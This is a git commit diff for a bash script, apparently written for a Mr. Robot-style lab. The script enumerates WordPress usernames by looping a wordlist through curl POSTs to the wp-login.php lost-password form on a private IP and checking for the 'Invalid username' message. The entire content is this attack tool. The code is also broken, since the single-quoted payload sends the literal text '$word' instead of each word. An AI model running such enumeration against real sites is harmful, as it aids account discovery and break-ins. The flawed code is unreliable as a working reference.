ddd11725189f1d57028d5b0356152cbfc179162d
Kasun Perera <kage@5h4d0w.kage>
2024-09-21 23:36:27 +0530

    Brute forcing scripts

--- mr-robot/test.sh
+++ mr-robot/test.sh
@@ -1,6 +1,9 @@
 #!/bin/bash
 
+echo "Starting enumeration..."
+
 while IFS= read -r word
 do
-	curl -X POST -d 'user_login=$word&redirect_to=&wp-submit=Get+New+Password' -s http://192.168.8.137/wp-login.php?action=lostpassword | if ! grep -q 'Invalid username or e-mail'; then echo "Match found: $word"; fi;
+	printf "Current word: $word\r";
+	curl -X POST -d 'user_login=$word&redirect_to=&wp-submit=Get+New+Password' -s http://192.168.100.61/wp-login.php?action=lostpassword | if ! grep 'Invalid username or e-mail'; then echo "Match found: $word"; break; fi;
 done < $1
